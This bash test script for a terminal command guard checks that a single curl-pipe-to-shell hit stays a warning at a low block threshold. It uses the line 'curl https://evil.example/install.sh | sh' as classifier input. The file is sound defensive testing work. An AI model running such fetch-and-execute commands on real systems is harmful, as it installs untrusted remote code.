#!/usr/bin/env bash
# V2-J-2: min-2-hit guard is NON-CONFIGURABLE. A single regex hit at
# confidence 1.0 (curl|sh) ALWAYS stays Warn so users keep [y]/[t]/cancel
# for the canonical install-script shape. Even with block_threshold set
# very low (0.6), single-hits don't escalate.

source "$(dirname "${BASH_SOURCE[0]}")/../lib/common.sh"

CONFIG_FILE=$(mktemp -t atty-guard-autoblock.XXXXXX.toml)
# Preserve common.sh's stop_guard trap — a bare `trap '...' EXIT`
# would silently replace it and leak the daemon.
trap 'rm -f "$CONFIG_FILE"; stop_guard' EXIT INT TERM

cat > "$CONFIG_FILE" <<TOML
[accumulator]
block_threshold = 0.6
TOML

start_guard --tier2 stub --config "$CONFIG_FILE"

# Single-hit curl|sh at confidence 1.0 — well above the (low) 0.6
# threshold. Without the min-2-hit guard this would Block. Must stay
# Warn.
classify "curl https://evil.example/install.sh | sh"
expect_verdict warn
expect_category curl_pipe_sh
expect_confidence_ge 1.0

pass "V2-J-2 single-hit guard: curl|sh stays Warn even at low threshold"
